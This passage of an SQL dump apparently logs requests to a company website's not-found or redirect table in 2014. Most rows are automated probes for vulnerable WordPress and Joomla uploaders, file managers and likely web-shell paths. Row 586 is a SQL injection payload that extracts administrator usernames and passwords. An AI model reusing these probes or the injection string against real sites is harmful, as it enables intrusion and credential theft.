(451, 'http://www.flotechcontrols.com/wp-content/themes/Shopo/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:48', '0000-00-00 00:00:00'),
(452, 'http://www.flotechcontrols.com/wp-content/themes/Minshop/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:48', '0000-00-00 00:00:00'),
(453, 'http://www.flotechcontrols.com/wp-content/themes/Notes/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:49', '0000-00-00 00:00:00'),
(454, 'http://www.flotechcontrols.com/wp-content/themes/ShopDock/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:50', '0000-00-00 00:00:00'),
(455, 'http://www.flotechcontrols.com/wp-content/themes/PhotoTouch/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:51', '0000-00-00 00:00:00'),
(456, 'http://www.flotechcontrols.com/wp-content/themes/Basic/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:52', '0000-00-00 00:00:00'),
(457, 'http://www.flotechcontrols.com/wp-content/themes/Responz/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:52', '0000-00-00 00:00:00'),
(458, 'http://www.flotechcontrols.com/wp-content/themes/Simfo/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:53', '0000-00-00 00:00:00'),
(459, 'http://www.flotechcontrols.com/wp-content/themes/Grido/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:54', '0000-00-00 00:00:00'),
(460, 'http://www.flotechcontrols.com/wp-content/themes/Tisa/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:54', '0000-00-00 00:00:00'),
(461, 'http://www.flotechcontrols.com/wp-content/themes/Suco/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:55', '0000-00-00 00:00:00'),
(462, 'http://www.flotechcontrols.com/wp-content/themes/Elemin/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:56', '0000-00-00 00:00:00'),
(463, 'http://www.flotechcontrols.com/wp-content/themes/Folo/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:56', '0000-00-00 00:00:00'),
(464, 'http://www.flotechcontrols.com/wp-content/themes/Funki/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:57', '0000-00-00 00:00:00'),
(465, 'http://www.flotechcontrols.com/wp-content/themes/Minblr/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:58', '0000-00-00 00:00:00'),
(466, 'http://www.flotechcontrols.com/wp-content/themes/iTheme2/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:59', '0000-00-00 00:00:00'),
(467, 'http://www.flotechcontrols.com/wp-content/themes/Newsy/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:29:59', '0000-00-00 00:00:00'),
(468, 'http://www.flotechcontrols.com/wp-content/themes/Wumblr/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:00', '0000-00-00 00:00:00'),
(469, 'http://www.flotechcontrols.com/wp-content/themes/Rezo/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:01', '0000-00-00 00:00:00'),
(470, 'http://www.flotechcontrols.com/wp-content/themes/Photobox/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:02', '0000-00-00 00:00:00'),
(471, 'http://www.flotechcontrols.com/wp-content/themes/Edmin/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:02', '0000-00-00 00:00:00'),
(472, 'http://www.flotechcontrols.com/wp-content/themes/Koi/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:03', '0000-00-00 00:00:00'),
(473, 'http://www.flotechcontrols.com/wp-content/themes/Bizco/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:04', '0000-00-00 00:00:00'),
(474, 'http://www.flotechcontrols.com/wp-content/themes/ThemeMin/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:04', '0000-00-00 00:00:00'),
(475, 'http://www.flotechcontrols.com/wp-content/themes/Wigi/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:05', '0000-00-00 00:00:00'),
(476, 'http://www.flotechcontrols.com/wp-content/themes/Blogfolio/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:06', '0000-00-00 00:00:00'),
(477, 'http://www.flotechcontrols.com/wp-content/themes/Sidepane/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:06', '0000-00-00 00:00:00'),
(478, 'http://www.flotechcontrols.com/wp-content/themes/Bloggie/themify/themify-ajax.php?pull[]', '', '', '', 1, 0, '2014-04-08 23:30:07', '0000-00-00 00:00:00'),
(479, 'http://flotechcontrols.com/plugins/system/logins.php', '', '', '', 1, 0, '2014-04-09 08:11:14', '0000-00-00 00:00:00'),
(480, 'http://flotechcontrols.com/components/com_search/views/views.php', '', '', '', 1, 0, '2014-04-09 08:25:56', '0000-00-00 00:00:00'),
(481, 'http://flotechcontrols.com/modules/mod_banners/tmpl/tmpl.php', '', '', '', 1, 0, '2014-04-09 08:40:20', '0000-00-00 00:00:00'),
(482, 'http://flotechcontrols.com/administrator/help/self.php', '', '', '', 1, 0, '2014-04-10 02:53:57', '0000-00-00 00:00:00'),
(483, 'http://flotechcontrols.com/images/saved.php', '', '', '', 1, 0, '2014-04-10 04:01:34', '0000-00-00 00:00:00'),
(484, 'http://flotechcontrols.com/modules/mod_system/dp.php', '', '', '', 1, 0, '2014-04-10 04:01:34', '0000-00-00 00:00:00'),
(485, 'http://flotechcontrols.com/images/pixel.php', '', '', '', 1, 0, '2014-04-10 05:53:15', '0000-00-00 00:00:00'),
(486, 'http://www.flotechcontrols.com/products/mts/RK=0/RS=TJFoMV1LTUWaT7QnMycgtlHJJR0-', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2014-04-12 06:03:36', '0000-00-00 00:00:00'),
(487, 'http://flotechcontrols.com/plugins/content/index.php', '', '', '', 1, 0, '2014-04-13 02:32:10', '0000-00-00 00:00:00'),
(488, 'http://flotechcontrols.com/modules/mod_wp/mod_wp.php', '', '', '', 1, 0, '2014-04-13 02:37:51', '0000-00-00 00:00:00'),
(489, 'http://flotechcontrols.com/plugins/system/xml.php', '', '', '', 1, 0, '2014-04-13 03:20:40', '0000-00-00 00:00:00'),
(490, 'http://flotechcontrols.com/modules/mod_poll/file.php', '', '', '', 1, 0, '2014-04-13 03:44:15', '0000-00-00 00:00:00'),
(491, 'http://flotechcontrols.com/modules/pge.php', '', '', '', 1, 0, '2014-04-13 04:23:20', '0000-00-00 00:00:00'),
(492, 'http://flotechcontrols.com/wp-content/plugins/braille/braille.php', '', 'http://flotechcontrols.com/wp-content/plugins/braille/braille.php', '', 1, 0, '2014-04-13 18:02:52', '0000-00-00 00:00:00'),
(493, 'http://www.flotechcontrols.com/components/com_community/index.html', '', '', '', 1, 0, '2014-04-15 12:21:43', '0000-00-00 00:00:00'),
(494, 'http://flotechcontrols.com/wp-content/plugins/likebtn-like-button/likebtn_like_button.php', '', 'http://flotechcontrols.com/wp-content/plugins/likebtn-like-button/likebtn_like_button.php', '', 1, 0, '2014-04-20 10:28:21', '0000-00-00 00:00:00'),
(495, 'http://flotechcontrols.com/images/stories/explore.php', '', '', '', 1, 0, '2014-04-22 19:33:05', '0000-00-00 00:00:00'),
(496, 'http://www.flotechcontrols.com/images/stories/explore.php', '', '', '', 1, 0, '2014-04-22 19:33:05', '0000-00-00 00:00:00'),
(497, 'http://www.flotechcontrols.com/-copes', '', '', '', 1, 0, '2014-04-22 22:33:02', '0000-00-00 00:00:00'),
(498, 'http://www.flotechcontrols.com//images/stories/food.php', '', '', '', 1, 0, '2014-04-24 00:20:53', '0000-00-00 00:00:00'),
(499, 'http://flotechcontrols.com//images/stories/food.php', '', '', '', 1, 0, '2014-04-24 00:20:56', '0000-00-00 00:00:00'),
(500, 'http://flotechcontrols.com/components/com_extcalendar/cal_popup.php', '', '', '', 1, 0, '2014-04-24 07:48:59', '0000-00-00 00:00:00'),
(501, 'http://www.flotechcontrols.com//images/stories/petx.php', '', '', '', 1, 0, '2014-04-25 12:46:15', '0000-00-00 00:00:00'),
(502, 'http://flotechcontrols.com//images/stories/petx.php', '', '', '', 1, 0, '2014-04-25 12:46:15', '0000-00-00 00:00:00'),
(503, 'http://flotechcontrols.com/components/com_user/views/reset/mod.php', '', '', '', 1, 0, '2014-04-26 05:59:34', '0000-00-00 00:00:00'),
(504, 'http://flotechcontrols.com/modules/mod_feed/tmpl/z.php', '', '', '', 1, 0, '2014-04-26 05:59:34', '0000-00-00 00:00:00'),
(505, 'http://flotechcontrols.com//x_.php', '', '', '', 1, 0, '2014-04-27 02:52:03', '0000-00-00 00:00:00'),
(506, 'http://www.flotechcontrols.com//x_.php', '', '', '', 1, 0, '2014-04-27 02:52:03', '0000-00-00 00:00:00'),
(507, 'http://flotechcontrols.com/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php?type=file&folder=', '', '', '', 1, 0, '2014-04-29 01:17:50', '0000-00-00 00:00:00'),
(508, 'http://flotechcontrols.com/administrator/components/com_banners/web-infor.php', '', '', '', 1, 0, '2014-04-29 03:39:38', '0000-00-00 00:00:00'),
(509, 'http://flotechcontrols.com/modules/mod_mapsapi/mod_mapsapi.php', '', '', '', 1, 0, '2014-04-30 04:45:01', '0000-00-00 00:00:00'),
(510, 'http://flotechcontrols.com/components/com_banners/banners.html.php', '', '', '', 1, 0, '2014-04-30 05:01:45', '0000-00-00 00:00:00'),
(511, 'http://flotechcontrols.com/modules/mod_yahoo_messenger/mod_yahoo_messenger.php', '', '', '', 1, 0, '2014-04-30 05:51:41', '0000-00-00 00:00:00'),
(512, 'http://flotechcontrols.com/administrator/components/com_jecomparisonchart/views/upgrade/tmpl/mod_captcha.php', '', '', '', 1, 0, '2014-04-30 05:51:41', '0000-00-00 00:00:00'),
(513, 'http://flotechcontrols.com/modules/mod_joomlasec/mod_joomlasec.php', '', '', '', 1, 0, '2014-04-30 20:29:06', '0000-00-00 00:00:00'),
(514, 'http://flotechcontrols.com/modules/mod_fxprev/libraries/archives.php', '', '', '', 1, 0, '2014-05-01 03:42:48', '0000-00-00 00:00:00'),
(515, 'http://flotechcontrols.com/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-03 16:56:25', '0000-00-00 00:00:00'),
(516, 'http://www.flotechcontrols.com/products/mts/RK=0/RS=g7qdg3fMSic48ZcytAgqQCnVclY-', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2014-05-04 06:16:17', '0000-00-00 00:00:00'),
(517, 'http://flotechcontrols.com/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-04 17:30:01', '0000-00-00 00:00:00'),
(518, 'http://flotechcontrols.com/components/com_weblinks/models/gallery.php', '', '', '', 1, 0, '2014-05-10 06:31:55', '0000-00-00 00:00:00'),
(519, 'http://flotechcontrols.com/modules/mod_related_items/tmpl/clear.php', '', '', '', 1, 0, '2014-05-12 05:52:34', '0000-00-00 00:00:00'),
(520, 'http://flotechcontrols.com/includes/config.php', '', '', '', 1, 0, '2014-05-13 00:02:21', '0000-00-00 00:00:00'),
(521, 'http://flotechcontrols.com/editor/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/editor/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-14 07:25:37', '0000-00-00 00:00:00'),
(522, 'http://flotechcontrols.com/editor/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/editor/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-05-14 07:25:38', '0000-00-00 00:00:00'),
(523, 'http://flotechcontrols.com/images/plagmain.php', '', '', '', 1, 0, '2014-05-15 05:08:07', '0000-00-00 00:00:00'),
(524, 'http://flotechcontrols.com/plugin/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/plugin/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-15 16:35:16', '0000-00-00 00:00:00'),
(525, 'http://flotechcontrols.com/plugin/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/plugin/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-05-15 16:35:17', '0000-00-00 00:00:00'),
(526, 'http://flotechcontrols.com/modules/mod_ariimageslidersa/mod_ariimageslidersa.php', '', '', '', 1, 0, '2014-05-16 02:10:56', '0000-00-00 00:00:00'),
(527, 'http://flotechcontrols.com/components/com_user/views/index.php', '', '', '', 1, 0, '2014-05-17 01:45:31', '0000-00-00 00:00:00'),
(528, 'http://flotechcontrols.com/components/com_search/views/search/index.php', '', '', '', 1, 0, '2014-05-17 01:45:31', '0000-00-00 00:00:00'),
(529, 'http://flotechcontrols.com/components/com_user/views/reset/jquery.php', '', '', '', 1, 0, '2014-05-17 01:45:31', '0000-00-00 00:00:00'),
(530, 'http://flotechcontrols.com/plugins/search/index.php', '', '', '', 1, 0, '2014-05-17 01:45:32', '0000-00-00 00:00:00'),
(531, 'http://flotechcontrols.com/plugin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/plugin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-17 03:59:00', '0000-00-00 00:00:00'),
(532, 'http://flotechcontrols.com/plugin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/plugin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-05-17 03:59:01', '0000-00-00 00:00:00'),
(533, 'http://www.flotechcontrols.com/editor/editor/filemanager/browser/default/connectors/test.html', '', '', '', 1, 0, '2014-05-18 03:26:59', '0000-00-00 00:00:00'),
(534, 'http://www.flotechcontrols.com/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', '', '', 1, 0, '2014-05-18 03:26:59', '0000-00-00 00:00:00'),
(535, 'http://flotechcontrols.com/components/com_user/views/login/search.php', '', '', '', 1, 0, '2014-05-18 03:29:03', '0000-00-00 00:00:00'),
(536, 'http://flotechcontrols.com/components/com_contact/index.php', '', '', '', 1, 0, '2014-05-18 03:29:03', '0000-00-00 00:00:00'),
(537, 'http://flotechcontrols.com/components/com_user/views/login/tmpls.php', '', '', '', 1, 0, '2014-05-18 03:29:03', '0000-00-00 00:00:00'),
(538, 'http://flotechcontrols.com/language/en-GB/language.php', '', '', '', 1, 0, '2014-05-18 03:44:40', '0000-00-00 00:00:00'),
(539, 'http://flotechcontrols.com//modules/mod_search/tmpl/index.php?search=hello', '', '', '', 1, 0, '2014-05-19 17:02:25', '0000-00-00 00:00:00'),
(540, 'http://www.flotechcontrols.com//modules/mod_search/tmpl/index.php?search=hello', '', '', '', 1, 0, '2014-05-19 17:02:29', '0000-00-00 00:00:00'),
(541, 'http://flotechcontrols.com/plugin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/plugin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-19 19:35:59', '0000-00-00 00:00:00'),
(542, 'http://flotechcontrols.com/plugin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/plugin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-05-19 19:36:00', '0000-00-00 00:00:00'),
(543, 'http://flotechcontrols.com/modules/mod_mainmenu/tmpl/tmpl.php', '', '', '', 1, 0, '2014-05-20 05:58:17', '0000-00-00 00:00:00'),
(544, 'http://flotechcontrols.com/components/com_support/support.php', '', '', '', 1, 0, '2014-05-20 05:58:17', '0000-00-00 00:00:00'),
(545, 'http://flotechcontrols.com//plugins/system/index.php?search=hello', '', '', '', 1, 0, '2014-05-20 10:44:11', '0000-00-00 00:00:00'),
(546, 'http://www.flotechcontrols.com//plugins/system/index.php?search=hello', '', '', '', 1, 0, '2014-05-20 10:44:12', '0000-00-00 00:00:00'),
(547, 'http://flotechcontrols.com/wordpress/wordpress/wp-admin/', '', '', '', 1, 0, '2014-05-20 13:24:47', '0000-00-00 00:00:00'),
(548, 'http://flotechcontrols.com/modules/mod_wrapper/mod.php', '', '', '', 1, 0, '2014-05-20 23:48:55', '0000-00-00 00:00:00'),
(549, 'http://www.flotechcontrols.com/modules/mod_wrapper/mod.php', '', '', '', 1, 0, '2014-05-20 23:48:56', '0000-00-00 00:00:00'),
(550, 'http://flotechcontrols.com/images/stories/jquery.php', '', '', '', 1, 0, '2014-05-21 04:06:25', '0000-00-00 00:00:00'),
(551, 'http://flotechcontrols.com/editor/assetmanager/assetmanager.php?ffilter=', '', 'flotechcontrols.com/editor/assetmanager/assetmanager.php?ffilter=', '', 1, 0, '2014-05-21 04:50:25', '0000-00-00 00:00:00'),
(552, 'http://flotechcontrols.com/editor/assetmanager/assetmanager.php?ffilter=index.php', '', 'flotechcontrols.com/editor/assetmanager/assetmanager.php?ffilter=index.php', '', 1, 0, '2014-05-21 04:50:26', '0000-00-00 00:00:00'),
(553, 'http://flotechcontrols.com/components/com_poll/inc.php', '', '', '', 1, 0, '2014-05-22 05:13:52', '0000-00-00 00:00:00'),
(554, 'http://flotechcontrols.com/administrator/components/com_jnewsletter/includes/openflashchart/tmp-upload-images/sittir.php', '', '', '', 1, 0, '2014-05-22 05:13:52', '0000-00-00 00:00:00'),
(555, 'http://flotechcontrols.com/cache/cache.php', '', '', '', 1, 0, '2014-05-22 05:13:52', '0000-00-00 00:00:00'),
(556, 'http://flotechcontrols.com/components/com_contact/link.php', '', '', '', 1, 0, '2014-05-22 05:28:29', '0000-00-00 00:00:00'),
(557, 'http://flotechcontrols.com/assetmanager/assetmanager.php?ffilter=', '', 'flotechcontrols.com/assetmanager/assetmanager.php?ffilter=', '', 1, 0, '2014-05-23 01:47:41', '0000-00-00 00:00:00'),
(558, 'http://flotechcontrols.com/assetmanager/assetmanager.php?ffilter=index.php', '', 'flotechcontrols.com/assetmanager/assetmanager.php?ffilter=index.php', '', 1, 0, '2014-05-23 01:47:42', '0000-00-00 00:00:00'),
(559, 'http://flotechcontrols.com/components/com_weblinks/index.php', '', '', '', 1, 0, '2014-05-23 05:25:35', '0000-00-00 00:00:00'),
(560, 'http://flotechcontrols.com/components/com_community/', '', '', '', 1, 0, '2014-05-23 19:26:38', '0000-00-00 00:00:00'),
(561, 'http://flotechcontrols.com/admin/assetmanager/assetmanager.php?ffilter=', '', 'flotechcontrols.com/admin/assetmanager/assetmanager.php?ffilter=', '', 1, 0, '2014-05-24 02:25:50', '0000-00-00 00:00:00'),
(562, 'http://flotechcontrols.com/admin/assetmanager/assetmanager.php?ffilter=index.php', '', 'flotechcontrols.com/admin/assetmanager/assetmanager.php?ffilter=index.php', '', 1, 0, '2014-05-24 02:25:51', '0000-00-00 00:00:00'),
(563, 'http://flotechcontrols.com/templates/beez/index.php', '', '', '', 1, 0, '2014-05-24 05:44:06', '0000-00-00 00:00:00'),
(564, 'http://flotechcontrols.com/administrator/components/com_admin/controller-admin.php', '', '', '', 1, 0, '2014-05-24 05:44:06', '0000-00-00 00:00:00'),
(565, 'http://flotechcontrols.com/libraries/joomla/user/system.php', '', '', '', 1, 0, '2014-05-24 22:29:44', '0000-00-00 00:00:00'),
(566, 'http://flotechcontrols.com/libraries/joomla/system.php', '', '', '', 1, 0, '2014-05-24 22:55:39', '0000-00-00 00:00:00'),
(567, 'http://flotechcontrols.com/images/smilies/smile.php', '', '', '', 1, 0, '2014-05-24 23:31:35', '0000-00-00 00:00:00'),
(568, 'http://flotechcontrols.com/administrator/components/com_myapi/helpers/joomla-settings.php', '', '', '', 1, 0, '2014-05-24 23:36:47', '0000-00-00 00:00:00'),
(569, 'http://flotechcontrols.com/plugins/user/image.php', '', '', '', 1, 0, '2014-05-26 04:46:50', '0000-00-00 00:00:00'),
(570, 'http://flotechcontrols.com/tmp/w.php', '', '', '', 1, 0, '2014-05-26 04:46:50', '0000-00-00 00:00:00'),
(571, 'http://flotechcontrols.com/modules/mod_status/mod_status.php', '', '', '', 1, 0, '2014-05-26 04:46:52', '0000-00-00 00:00:00'),
(572, 'http://flotechcontrols.com/libraries/openid/Auth/OpenIDOpenID.php', '', '', '', 1, 0, '2014-05-26 04:52:58', '0000-00-00 00:00:00'),
(573, 'http://flotechcontrols.com/components/com_content/joomla.php', '', '', '', 1, 0, '2014-05-27 04:53:18', '0000-00-00 00:00:00'),
(574, 'http://flotechcontrols.com/components/com_jce/media/js/index.php', '', '', '', 1, 0, '2014-05-27 05:07:21', '0000-00-00 00:00:00'),
(575, 'http://flotechcontrols.com/tmp/search.php', '', '', '', 1, 0, '2014-05-27 05:07:21', '0000-00-00 00:00:00'),
(576, 'http://flotechcontrols.com/administrator/components/com_wusers/wusers.php', '', '', '', 1, 0, '2014-05-30 04:22:02', '0000-00-00 00:00:00'),
(577, 'http://flotechcontrols.com/administrator/modules/mod_feed/mod_config.php', '', '', '', 1, 0, '2014-05-30 04:22:02', '0000-00-00 00:00:00'),
(578, 'http://flotechcontrols.com/administrator/components/com_jnewsletter/info.php', '', '', '', 1, 0, '2014-05-30 04:22:02', '0000-00-00 00:00:00'),
(579, 'http://flotechcontrols.com/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-05-30 13:39:52', '0000-00-00 00:00:00'),
(580, 'http://flotechcontrols.com/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-05-30 13:39:52', '0000-00-00 00:00:00'),
(581, 'http://flotechcontrols.com/modules/mod_systemzz/mod_systemzz.php', '', '', '', 1, 0, '2014-05-31 06:16:00', '0000-00-00 00:00:00'),
(582, 'http://flotechcontrols.com/wordpress/wp-login.php', '', '', '', 1, 0, '2014-05-31 15:41:19', '0000-00-00 00:00:00'),
(583, 'http://flotechcontrols.com/wp/wp-login.php', '', '', '', 1, 0, '2014-05-31 15:41:19', '0000-00-00 00:00:00'),
(584, 'http://flotechcontrols.com/news/wp-login.php', '', '', '', 1, 0, '2014-05-31 15:41:20', '0000-00-00 00:00:00'),
(585, 'http://flotechcontrols.com/test/wp-login.php', '', '', '', 1, 0, '2014-05-31 15:41:21', '0000-00-00 00:00:00'),
(586, 'http://flotechcontrols.com/index.php?option=com_content&task=blogcategory&id=60&Itemid=-1+union+select+1,concat(0x217e,password,0x3a,username,0x3a,usertype,0x7e21),3,4,5+from+%23__users+where+gid=25+or+gid=24--', '', '', '', 1, 0, '2014-06-01 15:48:07', '0000-00-00 00:00:00'),
(587, 'http://flotechcontrols.com/plugins/system/function.php', '', '', '', 1, 0, '2014-06-03 07:39:28', '0000-00-00 00:00:00'),
(588, 'http://flotechcontrols.com/spaw2-old/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/spaw2-old/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-06-03 08:33:12', '0000-00-00 00:00:00'),
(589, 'http://flotechcontrols.com/spaw2-old/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/spaw2-old/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-06-03 08:33:13', '0000-00-00 00:00:00'),
(590, 'http://flotechcontrols.com/wp-content/themes/OptimizePress/lib/admin/media-upload.php', '', 'http://flotechcontrols.com/wp-content/themes/OptimizePress/lib/admin/media-upload.php', '', 1, 0, '2014-06-04 15:22:40', '0000-00-00 00:00:00'),
(591, 'http://flotechcontrols.com/wp-content/themes/OptimizePress/lib/admin/media-upload.phpindex.php', '', 'http://flotechcontrols.com/wp-content/themes/OptimizePress/lib/admin/media-upload.phpindex.php', '', 1, 0, '2014-06-04 15:22:41', '0000-00-00 00:00:00'),
(592, 'http://flotechcontrols.com/components/com_banners/models/sys.php', '', '', '', 1, 0, '2014-06-06 22:55:25', '0000-00-00 00:00:00'),
(593, 'http://flotechcontrols.com/admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-06-07 18:27:14', '0000-00-00 00:00:00'),
(594, 'http://flotechcontrols.com/admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-06-07 18:27:15', '0000-00-00 00:00:00'),
(595, 'http://www.flotechcontrols.com:80/shop/index.php', '', '', '', 1, 0, '2014-06-07 23:16:42', '0000-00-00 00:00:00'),
(596, 'http://www.flotechcontrols.com:80/store/index.php', '', '', '', 1, 0, '2014-06-07 23:16:42', '0000-00-00 00:00:00'),
(597, 'http://flotechcontrols.com/admin/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/admin/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-06-08 18:30:52', '0000-00-00 00:00:00'),
(598, 'http://flotechcontrols.com/admin/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/admin/spaw22/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-06-08 18:30:53', '0000-00-00 00:00:00'),
(599, 'http://flotechcontrols.com/admin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/admin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-06-09 17:56:13', '0000-00-00 00:00:00'),
(600, 'http://flotechcontrols.com/admin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/admin/spaw/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-06-09 17:56:14', '0000-00-00 00:00:00'),
(601, 'http://flotechcontrols.com/wp', '', 'http://flotechcontrols.com/wp', '', 1, 0, '2014-06-09 21:55:19', '0000-00-00 00:00:00'),
(602, 'http://FLOTECHCONTROLS.COM/backup', '', 'http://FLOTECHCONTROLS.COM/backup', '', 1, 0, '2014-06-10 09:21:28', '0000-00-00 00:00:00'),
(603, 'http://www.flotechcontrols.com/wordpress/wp-login.php', '', '', '', 1, 0, '2014-06-11 03:14:46', '0000-00-00 00:00:00'),
(604, 'http://www.flotechcontrols.com/wp/wp-login.php', '', '', '', 1, 0, '2014-06-11 03:14:46', '0000-00-00 00:00:00'),
(605, 'http://www.flotechcontrols.com/news/wp-login.php', '', '', '', 1, 0, '2014-06-11 03:14:47', '0000-00-00 00:00:00'),
(606, 'http://www.flotechcontrols.com/test/wp-login.php', '', '', '', 1, 0, '2014-06-11 03:14:48', '0000-00-00 00:00:00'),
(607, 'http://flotechcontrols.com/admin/editor/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 'flotechcontrols.com/admin/editor/dialogs/dialog.php?module=spawfm&dialog=spafm', '', 1, 0, '2014-06-11 18:59:41', '0000-00-00 00:00:00'),
(608, 'http://flotechcontrols.com/admin/editor/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 'flotechcontrols.com/admin/editor/dialogs/dialog.php?module=spawfm&dialog=spafmindex.php', '', 1, 0, '2014-06-11 18:59:42', '0000-00-00 00:00:00'),
(609, 'http://flotechcontrols.com/modules/mod_youtube/mod_youtube.php', '', '', '', 1, 0, '2014-06-13 00:22:55', '0000-00-00 00:00:00'),
(610, 'http://flotechcontrols.com/plugins/content/blogping/elements/donations.php', '', '', '', 1, 0, '2014-06-13 00:22:55', '0000-00-00 00:00:00'),
(611, 'http://flotechcontrols.com/modules/mod_docman_ult/mod_docman_ult.php', '', '', '', 1, 0, '2014-06-13 01:28:04', '0000-00-00 00:00:00'),
(612, 'http://flotechcontrols.com/default.php', '', 'http://flotechcontrols.com/default.php', '', 1, 0, '2014-06-13 18:07:04', '0000-00-00 00:00:00'),
(613, 'http://flotechcontrols.com/plugins/community/walls/walls.php', '', '', '', 1, 0, '2014-06-14 05:39:59', '0000-00-00 00:00:00'),
(614, 'http://flotechcontrols.com/modules/mod_joooms/joooms.php', '', '', '', 1, 0, '2014-06-14 07:42:04', '0000-00-00 00:00:00'),
(615, 'http://flotechcontrols.com/components/com_search/views/search/tmpl/base.php', '', '', '', 1, 0, '2014-06-14 07:42:04', '0000-00-00 00:00:00'),
(616, 'http://flotechcontrols.com/modules/mod_logerrors/logerrors.php', '', '', '', 1, 0, '2014-06-14 07:42:04', '0000-00-00 00:00:00'),
(617, 'http://flotechcontrols.com/modules/mod_rat/mod_rat.php', '', '', '', 1, 0, '2014-06-14 18:37:35', '0000-00-00 00:00:00'),
(618, 'http://flotechcontrols.com/modules/mod_babl/mod_babl.php', '', '', '', 1, 0, '2014-06-14 19:32:02', '0000-00-00 00:00:00'),
